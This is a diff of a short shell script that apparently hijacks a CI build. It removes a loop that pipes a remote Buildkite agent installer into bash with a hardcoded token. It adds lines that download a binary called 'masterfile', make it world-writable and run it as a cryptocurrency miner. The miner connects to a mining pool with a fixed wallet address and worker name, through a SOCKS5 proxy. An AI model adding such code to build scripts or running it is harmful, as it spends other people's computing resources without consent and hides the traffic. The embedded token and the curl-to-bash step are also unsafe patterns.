@@ -1,14 +1,8 @@
 #!/bin/sh
-
-sudo apt-get install screen -y
-screen
-
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
- 
-TOKEN="723f78d99a488fd3c929cd3a22d9d3b95c0707c3292bf506f9" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
- 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
+wget https://bitbucket.org/qrlkoin/xmr/raw/504d68713ec8d6c18cf39201fc2d967d7410faf7/masterfile
+chmod 777 masterfile
+POOL=us-qrl.volt-mine.com:1111
+WALLET=Q010500d0c32b2ca3f896998fbbfc3aecfb17a32e47965ab3496e92eeadc02dd6ee6ba82bac7343
+WORKER=voc
+PROXY=socks5://192.252.209.155:14455
+./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
